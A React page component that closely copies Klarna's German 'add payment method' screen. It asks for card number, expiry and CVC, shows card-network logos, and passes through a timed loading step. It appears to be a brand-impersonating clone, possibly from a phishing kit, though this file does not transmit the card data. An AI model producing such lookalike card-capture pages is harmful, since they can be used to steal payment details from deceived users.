import { useState } from "react";
import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
import { CreditCard, Calendar, Lock, X } from "lucide-react";

export const Route = createFileRoute("/add-card")({
  head: () => ({
    meta: [
      { title: "Zahlungsmethode hinzufügen — Klarna" },
      { name: "description", content: "Füge eine Karte als Zahlungsmethode hinzu." },
      { property: "og:title", content: "Zahlungsmethode hinzufügen — Klarna" },
      { property: "og:description", content: "Füge eine Karte als Zahlungsmethode hinzu." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
    ],
  }),
  component: AddCardPage,
});

function AddCardPage() {
  const navigate = useNavigate();
  const [number, setNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvc, setCvc] = useState("");

  const canContinue = number.trim().length > 0 && expiry.trim().length > 0 && cvc.trim().length > 0;

  const handleAddCard = () => {
    if (!canContinue) return;
    try {
      sessionStorage.setItem("paymentMethod", "card");
      sessionStorage.removeItem("bankName");
      sessionStorage.removeItem("bankLogo");
    } catch {
      // ignore
    }
    navigate({ to: "/loading", search: { to: "/confirm", ms: 3000 } });
  };

  const formatNumber = (v: string) => v.replace(/\D/g, "").slice(0, 19).replace(/(.{4})/g, "$1 ").trim();
  const formatExpiry = (v: string) => {
    const d = v.replace(/\D/g, "").slice(0, 4);
    return d.length <= 2 ? d : `${d.slice(0, 2)}/${d.slice(2)}`;
  };

  return (
    <div className="min-h-screen bg-[#8a8a8a] p-0 sm:bg-neutral-100 sm:p-4">
      <div className="mx-auto flex w-[600px] max-w-full items-start justify-center">
        <div className="flex mt-3 h-[calc(100vh-0.75rem)] sm:mt-0 sm:h-[calc(100vh-2rem)] max-h-none sm:max-h-[1043px] w-full flex-col overflow-hidden bg-white rounded-t-[32px] sm:rounded-2xl shadow-xl">
          <div className="shrink-0 px-8 pt-8 sm:px-10">
            <div className="flex items-start justify-end">
              <Link
                to="/payment-method"
                aria-label="Schließen"
                className="rounded-full p-1 text-[#0b051d] transition-colors hover:bg-neutral-100"
              >
                <X className="h-6 w-6" strokeWidth={2} />
              </Link>
            </div>
          </div>
          <div className="flex flex-1 flex-col overflow-y-auto px-8 pb-6 sm:px-10">

            <h1 className="mt-2 text-[26px] font-bold leading-tight text-[#0b051d]">
              Füge eine Zahlungsmethode hinzu
            </h1>
            <p className="mt-3 text-[15px] text-[#373544]">
              Dies wird für deine Zahlungen verwendet. Keine Sorge,{" "}
              <span>in diesem Schritt wird nichts berechnet.</span>
            </p>

            <div className="mt-6">
              <label htmlFor="card-number" className="text-[14px] font-semibold text-[#0b051d]">
                Kartennummer
              </label>
              <div className="mt-2 flex h-14 items-center gap-3 rounded-xl border border-neutral-300 bg-white px-4 transition-colors hover:bg-neutral-100 focus-within:border-[#0b051d] focus-within:!bg-white">
                <CreditCard className="h-5 w-5 shrink-0 text-[#0b051d]" strokeWidth={2} />
                <input
                  id="card-number"
                  type="text"
                  inputMode="numeric"
                  value={number}
                  onChange={(e) => setNumber(formatNumber(e.target.value))}
                  className="h-full flex-1 bg-transparent text-[15px] text-[#0b051d] outline-none"
                />
              </div>
            </div>

            <div className="mt-4 grid grid-cols-2 gap-4">
              <div>
                <label htmlFor="card-expiry" className="text-[14px] font-semibold text-[#0b051d]">
                  Ablaufdatum
                </label>
                <div className="mt-2 flex h-14 items-center gap-3 rounded-xl border border-neutral-300 bg-white px-4 transition-colors hover:bg-neutral-100 focus-within:border-[#0b051d] focus-within:!bg-white">
                  <Calendar className="h-5 w-5 shrink-0 text-[#0b051d]" strokeWidth={2} />
                  <input
                    id="card-expiry"
                    type="text"
                    inputMode="numeric"
                    placeholder="MM/JJ"
                    value={expiry}
                    onChange={(e) => setExpiry(formatExpiry(e.target.value))}
                    className="h-full flex-1 bg-transparent text-[15px] text-[#0b051d] outline-none placeholder:text-[#6b6b6b]"
                  />
                </div>
              </div>
              <div>
                <label htmlFor="card-cvc" className="text-[14px] font-semibold text-[#0b051d]">
                  CVC
                </label>
                <div className="mt-2 flex h-14 items-center gap-3 rounded-xl border border-neutral-300 bg-white px-4 transition-colors hover:bg-neutral-100 focus-within:border-[#0b051d] focus-within:!bg-white">
                  <Lock className="h-5 w-5 shrink-0 text-[#0b051d]" strokeWidth={2} />
                  <input
                    id="card-cvc"
                    type="text"
                    inputMode="numeric"
                    value={cvc}
                    onChange={(e) => setCvc(e.target.value.replace(/\D/g, "").slice(0, 4))}
                    className="h-full flex-1 bg-transparent text-[15px] text-[#0b051d] outline-none"
                  />
                </div>
              </div>
            </div>

            <div className="mt-4 flex items-center gap-2" aria-hidden="true">
              <svg width="33" height="22" fill="none" viewBox="1 3 31 15">
                <path fill="#1334CB" d="m12.89 3.922-3.928 9.37H6.4L4.467 5.816c-.117-.46-.22-.629-.575-.823-.584-.317-1.546-.613-2.392-.798l.057-.272h4.125c.525 0 .997.35 1.118.956L7.82 10.3l2.523-6.378h2.547Zm10.04 6.311c.01-2.472-3.42-2.61-3.396-3.715.008-.336.328-.693 1.029-.785.347-.044 1.306-.08 2.39.42l.425-1.99a6.53 6.53 0 0 0-2.268-.413c-2.397 0-4.082 1.272-4.095 3.097-.016 1.35 1.204 2.101 2.122 2.551.944.46 1.26.755 1.257 1.164-.007.63-.755.907-1.45.918-1.22.02-1.927-.329-2.49-.591l-.44 2.054c.566.26 1.612.486 2.695.497 2.547 0 4.214-1.258 4.22-3.207Zm6.328 3.06H31.5l-1.958-9.37h-2.068c-.467 0-.858.27-1.032.687l-3.637 8.683h2.545l.506-1.4h3.11l.294 1.4h-.002Zm-2.705-3.32 1.276-3.519.734 3.52h-2.01Zm-10.198-6.05-2.004 9.371h-2.424l2.004-9.37h2.425-.001ZM17.822 17.69v-2.534h1.584v.27h-1.26v.81h1.003v.266h-1.003v.917h1.26v.27h-1.584ZM20.207 15.057v2.633h-.297v-2.633h.297ZM21.622 17.496c.168 0 .305-.02.41-.06.106-.042.2-.097.285-.166h.007l-.026.27a.839.839 0 0 1-.26.133 1.327 1.327 0 0 1-.44.064.963.963 0 0 1-.501-.127.883.883 0 0 1-.335-.35c-.08-.148-.12-.32-.12-.51s.04-.36.119-.51a.899.899 0 0 1 .323-.35.844.844 0 0 1 .461-.128c.197 0 .359.034.482.105.124.07.214.168.27.293.055.125.084.273.084.44 0 .021 0 .048-.002.08a1.065 1.065 0 0 1-.01.083h-1.424s0 .004.002.007c0 .003 0 .004-.002.007.005.225.067.401.186.53.12.13.284.194.49.194v-.005Zm-.074-1.51a.546.546 0 0 0-.403.154.702.702 0 0 0-.186.426h1.136v-.034a.763.763 0 0 0-.05-.288.385.385 0 0 0-.168-.19.657.657 0 0 0-.328-.069v.002ZM22.695 16.75c0-.191.039-.36.116-.51a.867.867 0 0 1 .33-.35.944.944 0 0 1 .5-.128c.168 0 .3.02.4.057a.704.704 0 0 1 .218.12l.03.313h-.007a.922.922 0 0 0-.272-.18.903.903 0 0 0-.351-.064.615.615 0 0 0-.575.345.868.868 0 0 0-.085.399c0 .233.062.414.189.543a.65.65 0 0 0 .489.193c.107 0 .197-.01.27-.028a.707.707 0 0 0 .194-.08 1.61 1.61 0 0 0 .168-.118h.01l-.031.27a.736.736 0 0 1-.242.14 1.102 1.102 0 0 1-.405.066.954.954 0 0 1-.5-.126.872.872 0 0 1-.331-.35 1.086 1.086 0 0 1-.117-.51l.002-.001ZM25.145 17.184c0 .12.025.2.076.241a.307.307 0 0 0 .2.061.911.911 0 0 0 .198-.019.643.643 0 0 0 .136-.047h.01l-.027.25a.582.582 0 0 1-.15.047.992.992 0 0 1-.203.02.598.598 0 0 1-.393-.118c-.096-.08-.143-.209-.143-.39v-1.176h-.347l.04-.197.307-.043v-.403l.297-.043v.44h.577l-.036.248h-.54v1.13l-.002-.001ZM26.863 16.068a.432.432 0 0 0-.343.139c-.081.091-.123.232-.123.418v1.066H26.1v-1.883h.283v.393h.017c.041-.164.114-.28.216-.343a.62.62 0 0 1 .425-.092c.03.003.052.007.066.011l-.037.324h-.01a.516.516 0 0 0-.197-.033ZM28.23 15.76c.185 0 .347.044.489.129a.908.908 0 0 1 .332.35c.08.15.12.32.12.51s-.041.362-.12.51a.896.896 0 0 1-.821.477.898.898 0 0 1-.82-.476c-.08-.15-.119-.32-.119-.51s.04-.361.12-.51a.901.901 0 0 1 .819-.48Zm0 1.731c.208 0 .366-.066.472-.198.106-.132.158-.313.158-.542 0-.23-.052-.413-.158-.544-.106-.132-.262-.199-.472-.199-.21 0-.367.067-.474.199-.107.131-.16.313-.16.544 0 .23.053.41.16.542.107.132.264.198.474.198ZM30.577 15.76c.204 0 .364.053.48.158.116.104.175.268.175.49v1.283h-.293v-1.2c0-.158-.034-.276-.102-.355-.068-.08-.19-.118-.368-.118a.62.62 0 0 0-.285.064.51.51 0 0 0-.202.18.499.499 0 0 0-.075.276v1.153h-.298v-1.883h.284v.4h.016a.595.595 0 0 1 .162-.258.664.664 0 0 1 .242-.143.817.817 0 0 1 .266-.045l-.002-.001Z" />
              </svg>
              <svg width="33" height="22" viewBox="10 10 128 84" xmlSpace="preserve">
                <g>
                  <rect y="0" fill="none" width="152.4" height="108" />
                  <g>
                    <rect x="60.4" y="25.7" fill="#FF5F00" width="31.5" height="56.6" />
                    <path fill="#EB001B" d="M62.4,54c0-11,5.1-21.5,13.7-28.3c-15.6-12.3-38.3-9.6-50.6,6.1C13.3,47.4,16,70,31.7,82.3 c13.1,10.3,31.4,10.3,44.5,0C67.5,75.5,62.4,65,62.4,54z" />
                    <path fill="#F79E1B" d="M134.4,54c0,19.9-16.1,36-36,36c-8.1,0-15.9-2.7-22.2-7.7c15.6-12.3,18.3-34.9,6-50.6c-1.8-2.2-3.8-4.3-6-6 c15.6-12.3,38.3-9.6,50.5,6.1C131.7,38.1,134.4,45.9,134.4,54z" />
                  </g>
                </g>
              </svg>
              <svg width="33" height="22" fill="#1434cb" viewBox="0 0 1336 430">
                <path d="M507.369 7.60031L332.588 423.495H218.557L132.547 91.592C127.325 71.1489 122.785 63.6595 106.904 55.0468C80.9894 41.0181 38.172 27.8632 0.5 19.6942L3.05875 7.60031H186.614C210.012 7.60031 231.045 23.1338 236.357 50.0053L281.782 290.663L394.047 7.60031H507.369ZM954.17 287.709C954.629 177.942 801.98 171.895 803.03 122.86C803.356 107.937 817.603 92.0705 848.788 88.0207C864.245 86.0028 906.833 84.4633 955.136 106.633L974.083 18.4391C948.127 9.0427 914.732 0 873.18 0C766.554 0 691.515 56.5308 690.883 137.478C690.194 197.351 744.443 230.762 785.313 250.658C827.359 271.031 841.466 284.124 841.307 302.348C841.008 330.246 807.772 342.562 776.712 343.047C722.492 343.879 691.029 328.415 665.949 316.786L646.397 407.899C671.602 419.432 718.125 429.494 766.359 430C879.688 430 953.822 374.17 954.17 287.709ZM1235.73 423.502H1335.5L1248.41 7.60031H1156.32C1135.62 7.60031 1118.15 19.6249 1110.42 38.1125L948.545 423.495H1061.82L1084.31 361.368H1222.71L1235.74 423.495L1235.73 423.502ZM1115.36 276.135L1172.14 119.982L1204.82 276.135H1115.37H1115.36ZM661.506 7.60031L572.304 423.495H464.433L553.67 7.60031H661.506Z" />
              </svg>
              <svg width="33" height="22" viewBox="15 15 117 91">
                <g>
                  <rect width="146.776" height="120.641" style={{ fill: "none" }} />
                  <g transform="translate(-322.61159 -245.6795)">
                    <rect x="380.24951" y="268.5138" width="31.5" height="56.6064" fill="#7375cf" />
                    <path d="M382.24969,296.817a35.93765,35.93765,0,0,1,13.7499-28.3032,36,36,0,1,0,0,56.6064A35.9378,35.9378,0,0,1,382.24969,296.817Z" fill="#eb001b" />
                    <path d="M454.24479,296.817a35.99867,35.99867,0,0,1-58.2452,28.3032,36.00518,36.00518,0,0,0,0-56.6064,35.99867,35.99867,0,0,1,58.2452,28.3032Z" fill="#00a2e5" />
                  </g>
                </g>
              </svg>
            </div>

            <p className="mt-4 text-[13px] text-[#373544]">
              Klarna speichert und verwendet deine Kartendaten für reibungslose und sichere zukünftige Einkäufe.
            </p>
          </div>

          <div className="relative bg-white px-8 pb-6 pt-3 sm:px-10">
            <button
              type="button"
              disabled={!canContinue}
              onClick={handleAddCard}
              className={`h-14 w-full rounded-full text-[15px] font-semibold transition-colors ${
                canContinue
                  ? "bg-[#0b051d] text-white hover:bg-[#1a1230]"
                  : "cursor-not-allowed bg-neutral-200 text-neutral-500"
              }`}
            >
              Karte hinzufügen
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
